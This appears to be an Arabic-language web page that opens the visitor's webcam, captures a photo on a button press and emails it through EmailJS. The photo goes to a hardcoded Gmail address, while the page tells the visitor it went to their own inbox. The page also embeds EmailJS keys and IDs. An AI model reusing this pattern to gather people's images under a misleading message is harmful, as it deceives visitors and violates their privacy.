<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقاط وإرسال الصورة عبر البريد</title>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        // 🔑 تم استبدال المفتاح العام (Public Key)
        (function() {
            emailjs.init("WF5J_sXl1iz-prrm"); 
        })();
    </script>

    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background-color: #121212; color: #e0e0e0; padding: 20px; }
        h1 { color: #00bcd4; }
        .camera-feed { margin: 20px auto; width: 90%; max-width: 600px; border: 5px solid #00bcd4; background-color: #000; }
        video { width: 100%; display: block; }
        button { padding: 12px 25px; font-size: 18px; cursor: pointer; background-color: #4caf50; color: white; border: none; border-radius: 8px; margin-top: 15px; transition: background-color 0.3s; }
        button:hover { background-color: #45a049; }
        #status { margin-top: 20px; font-weight: bold; font-size: 1.1em; color: #ffeb3b; }
    </style>
</head>
<body>

    <h1>📸 التقط صورتك الآن 📸</h1>
    <p>يُرجى النقر على "سماح" لاستخدام الكاميرا ثم اضغط على زر الإرسال.</p>

    <div class="camera-feed">
        <video id="videoElement" autoplay></video>
    </div>

    <button onclick="captureAndSend()">التقاط وإرسال الصورة عبر الإيميل</button>
    <div id="status"></div>

    <script>
        const video = document.getElementById('videoElement');
        const statusDiv = document.getElementById('status');
        let stream;

        // طلب الوصول للكاميرا
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(s) {
                stream = s;
                video.srcObject = stream;
                statusDiv.textContent = 'الكاميرا جاهزة. يمكنك التقاط الصورة.';
            })
            .catch(function(err) {
                statusDiv.textContent = '❌ خطأ: لم نتمكن من الوصول إلى الكاميرا. تحقق من الأذونات.';
                console.error("خطأ: " + err);
            });

        // التقاط وإرسال الصورة
        function captureAndSend() {
            if (!stream) {
                statusDiv.textContent = '❌ الكاميرا غير متاحة للإرسال.';
                return;
            }

            // إنشاء عنصر Canvas لأخذ لقطة عالية الجودة
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            
            // رسم إطار الفيديو على Canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تصدير الصورة كبيانات Data URL بجودة عالية (0.95)
            const imageDataURL = canvas.toDataURL('image/jpeg', 0.95);

            statusDiv.textContent = '⏳ جارٍ إرسال الصورة عبر البريد الإلكتروني...';

            // بيانات الإرسال لـ EmailJS
            const templateParams = {
                // المتغير الذي سيحتوي على الصورة المشفرة
                image_data: imageDataURL,
                subject: "صورة ملتقطة حديثاً",
                to_email: "dkk43533@gmail.com" // بريدك الإلكتروني الذي يستقبل الإشعارات
            };

            // 🔑 تم استبدال معرّف الخدمة (Service ID) ومعرّف النموذج (Template ID) 
            const serviceID = 'service_9e2nevs'; 
            const templateID = 'template_0w8m0jj'; 

            // إرسال البريد الإلكتروني
            emailjs.send(serviceID, templateID, templateParams)
                .then(function(response) {
                    statusDiv.textContent = '✅ تم إرسال الصورة بنجاح إلى بريدك الإلكتروني!';
                    console.log('SUCCESS!', response.status, response.text);
                }, function(error) {
                    statusDiv.textContent = '❌ فشل الإرسال. تحقق من اتصالك بالإنترنت ومن إعدادات EmailJS.';
                    console.log('FAILED...', error);
                });
        }
    </script>
</body>
</html>
